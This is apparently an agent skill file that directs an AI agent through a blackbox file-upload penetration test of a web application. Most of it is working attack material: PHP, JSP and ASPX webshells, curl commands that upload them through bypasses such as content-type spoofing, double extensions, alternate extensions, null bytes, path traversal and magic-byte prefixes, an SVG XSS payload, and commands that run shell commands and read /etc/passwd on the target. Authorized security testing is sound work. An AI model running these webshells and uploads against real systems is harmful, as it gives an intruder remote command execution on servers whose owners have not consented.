---
name: blackbox-fileupload
description: >-
  Actively test a target web application for insecure file upload
  vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  finds all file upload endpoints, tests extension bypass vectors (content-type
  spoofing, blocklist gaps, double extension, case bypass, path traversal in
  filename), attempts to upload webshells, and confirms execution via HTTP
  access. Writes confirmed findings with PoC curl commands to
  pentest/fileupload-results.md. Use when asked to find file upload or
  unrestricted upload bugs in a blackbox pentest.
---

# Blackbox File Upload Vulnerability Detection

You are actively testing a web application for insecure file upload vulnerabilities without source code access. You will test all upload endpoints with various bypass techniques to determine if malicious files can be uploaded and executed.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## Phase 1: Identify Upload Endpoints

Read `pentest/target-map.md` and identify all file upload features:

- Endpoints with `multipart/form-data` requests
- Features like: avatar upload, document upload, image upload, attachment, import, media
- Form fields of type `file`
- API parameters named `file`, `upload`, `attachment`, `document`, `image`, `media`

Write candidates to `pentest/fileupload-recon.md`.

---

## Phase 2: Reconnaissance — Understand the Upload Endpoint

Before injecting, understand how the upload works:

```bash
# Upload a valid test file to observe behavior
echo "test content" > /tmp/test_valid.txt

# Try uploading as plain file
curl -sk -X POST "<TARGET_URL>/api/upload" \
  -H "Authorization: Bearer <TOKEN>" \
  -F "file=@/tmp/test_valid.txt;type=text/plain" \
  -D -

# Try uploading a small JPEG
curl -sk -X POST "<TARGET_URL>/upload" \
  -F "file=@/tmp/test.jpg;type=image/jpeg" \
  -D -
```

Note:
- **Where is the file stored?** (URL in response, path in JSON)
- **Is the filename preserved or renamed?**
- **What content types are accepted?**
- **What error message appears for rejected files?**

---

## Phase 3: Extension Bypass Testing

### Test 1: No Validation (Upload PHP directly)
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

curl -sk -X POST "<TARGET_URL>/upload" \
  -H "Authorization: Bearer <TOKEN>" \
  -F "file=@/tmp/shell.php;type=image/jpeg"
```

### Test 2: Content-Type Spoofing
If the server accepts only `image/jpeg` but may not check the extension:
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Set Content-Type to image/jpeg but upload .php file
curl -sk -X POST "<TARGET_URL>/upload" \
  -F "file=@/tmp/shell.php;type=image/jpeg"
```

### Test 3: Double Extension
```bash
cp /tmp/shell.php /tmp/shell.php.jpg

curl -sk -X POST "<TARGET_URL>/upload" \
  -F "file=@/tmp/shell.php.jpg;type=image/jpeg"
```

### Test 4: Alternate PHP Extensions
```bash
for EXT in php3 php4 php5 php7 phtml phar shtml; do
  cp /tmp/shell.php /tmp/shell.$EXT
  echo "Testing .$EXT:"
  curl -sk -X POST "<TARGET_URL>/upload" \
    -F "file=@/tmp/shell.$EXT;type=image/jpeg" -D -
done
```

### Test 5: Case Variation
```bash
cp /tmp/shell.php /tmp/shell.PHP
cp /tmp/shell.php /tmp/shell.Php
cp /tmp/shell.php /tmp/shell.pHp

curl -sk -X POST "<TARGET_URL>/upload" \
  -F "file=@/tmp/shell.PHP;type=image/jpeg"
```

### Test 6: Null Byte Injection (Older PHP)
```bash
# Filename: shell.php%00.jpg
curl -sk -X POST "<TARGET_URL>/upload" \
  -F $'file=@/tmp/shell.php\x00.jpg;type=image/jpeg;filename=shell.php\x00.jpg'
```

### Test 7: JSP/ASPX/ASP Shells (Java/.NET targets)
```bash
# JSP shell
cat > /tmp/shell.jsp << 'EOF'
<% Runtime rt = Runtime.getRuntime(); String[] commands = {"/bin/sh", "-c", request.getParameter("cmd")}; Process proc = rt.exec(commands); java.io.InputStream is = proc.getInputStream(); java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A"); String output = s.hasNext() ? s.next() : ""; out.println(output); %>
EOF

curl -sk -X POST "<TARGET_URL>/upload" \
  -F "file=@/tmp/shell.jsp;type=image/jpeg"

# ASPX shell
cat > /tmp/shell.aspx << 'EOF'
<%@ Page Language="C#" %><%System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+Request["cmd"]; p.StartInfo.UseShellExecute=false; p.StartInfo.RedirectStandardOutput=true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>
EOF

curl -sk -X POST "<TARGET_URL>/upload" \
  -F "file=@/tmp/shell.aspx;type=image/jpeg"
```

### Test 8: Path Traversal in Filename
```bash
# Try to upload outside the intended directory
curl -sk -X POST "<TARGET_URL>/upload" \
  -F $'file=@/tmp/shell.php;filename=../../webroot/shell.php;type=image/jpeg'

curl -sk -X POST "<TARGET_URL>/upload" \
  -F $'file=@/tmp/shell.php;filename=../shell.php;type=image/jpeg'
```

### Test 9: SVG XSS (if valid image types are restricted)
```bash
cat > /tmp/evil.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100"/>
</svg>
EOF

curl -sk -X POST "<TARGET_URL>/upload" \
  -F "file=@/tmp/evil.svg;type=image/svg+xml"
```

---

## Phase 4: Confirm Execution

After successfully uploading, determine if the file is accessible and executable:

```bash
# If upload response contains a URL:
# {"url": "https://target.com/uploads/shell.php"}
curl -sk "https://target.com/uploads/shell.php?cmd=id"

# If filename is preserved, try common paths:
curl -sk "<TARGET_URL>/uploads/shell.php?cmd=id"
curl -sk "<TARGET_URL>/static/uploads/shell.php?cmd=id"
curl -sk "<TARGET_URL>/media/shell.php?cmd=id"
curl -sk "<TARGET_URL>/files/shell.php?cmd=id"
curl -sk "<TARGET_URL>/public/uploads/shell.php?cmd=id"

# For JSP
curl -sk "<TARGET_URL>/uploads/shell.jsp?cmd=id"

# For ASPX
curl -sk "<TARGET_URL>/uploads/shell.aspx?cmd=systeminfo"
```

**Confirmed upload RCE** if the response contains command output (`uid=`, system info, etc.).

---

## Phase 5: Magic Bytes Bypass

If the server validates file content (magic bytes), prepend valid image bytes:

```bash
# JPEG magic bytes + PHP code
printf "\xff\xd8\xff<?php system(\$_GET['cmd']); ?>" > /tmp/shell_jpeg.php

curl -sk -X POST "<TARGET_URL>/upload" \
  -F "file=@/tmp/shell_jpeg.php;type=image/jpeg"

# PNG magic bytes
printf "\x89PNG\r\n\x1a\n<?php system(\$_GET['cmd']); ?>" > /tmp/shell_png.php

curl -sk -X POST "<TARGET_URL>/upload" \
  -F "file=@/tmp/shell_png.php;type=image/png"
```

---

## Phase 6: Cloud Storage Bypass

If files are stored in S3 or similar (URL contains `s3.amazonaws.com`, `blob.core.windows.net`, `storage.googleapis.com`):

Even if execution is Not possible, note:
- Does the file URL require authentication to access? (test without auth)
- Are filenames predictable (sequential IDs)?
- Is ACL open (public-read)?

```bash
# Test if uploaded file is publicly accessible
UPLOAD_URL="<URL_FROM_UPLOAD_RESPONSE>"
curl -sk -o /dev/null -w "%{http_code}" "$UPLOAD_URL"
# 200 = public access (may be intended but worth noting)
# 403 = access controlled (good)
```

---

## Output Format

Write findings to `pentest/fileupload-results.md`:

```markdown
# File Upload Assessment Results

## Executive Summary
- Upload endpoints tested: [N]
- Confirmed Webshell Upload + RCE: [N]
- Confirmed Upload Bypass (no execution): [N]
- SVG XSS via Upload: [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED RCE] /api/upload — PHP webshell via content-type spoofing

- **Endpoint**: `POST /api/upload`
- **Bypass**: Content-Type header set to `image/jpeg` while extension is `.php`
- **Storage path**: `/uploads/` — web-accessible, PHP execution enabled
- **Impact**: Full RCE — attacker uploads PHP webshell and executes arbitrary OS commands
- **Evidence**: HTTP 200 on upload; accessing `/uploads/shell.php?cmd=id` returns `uid=33(www-data)`
- **PoC**:
  ```bash
  # Step 1: Upload PHP webshell (spoof Content-Type)
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
  curl -sk -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer <TOKEN>" \
    -F "file=@/tmp/shell.php;type=image/jpeg"
  # Response: {"url":"/uploads/shell.php","status":"success"}

  # Step 2: Execute commands via webshell
  curl -sk "https://target.com/uploads/shell.php?cmd=id"
  # Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)

  # Step 3: Read sensitive files
  curl -sk "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
  ```
- **Remediation**: (1) Implement an extension allowlist (not blocklist). (2) Rename files to UUID + safe extension on upload. (3) Store uploads outside the web root. (4) Serve files through a download controller with Content-Disposition: attachment.

### [CONFIRMED UPLOAD - NO EXEC] /profile/avatar — .phtml extension bypass

- **Endpoint**: `POST /profile/avatar`
- **Bypass**: `.phtml` extension not in blocklist; server serves file but Apache does not execute `.phtml` in this config
- **Risk**: Lower severity — file stored with PHP-like extension but not executed; may be executed if configuration changes
- **Remediation**: Switch to allowlist-based extension validation. Add `.phtml`, `.php3`, `.php4`, `.php5`, `.phar` to the blocked list at minimum.
```

After writing results, delete `pentest/fileupload-recon.md`.

---

## Important Reminders

- Always confirm execution by accessing the uploaded file — a successful upload response alone is not RCE.
- Content-Type is fully attacker-controlled — never treat it as a security control.
- Test multiple alternate extensions for PHP servers — `.phtml` and `.phar` are commonly missed.
- If files are stored in cloud storage (S3/GCS/Azure Blob), execution is not possible but check for public access.
- SVG XSS is a medium severity finding even without RCE potential.
- Clean up: delete `pentest/fileupload-recon.md` after writing results. Clean up any test files you uploaded if there's a delete endpoint.
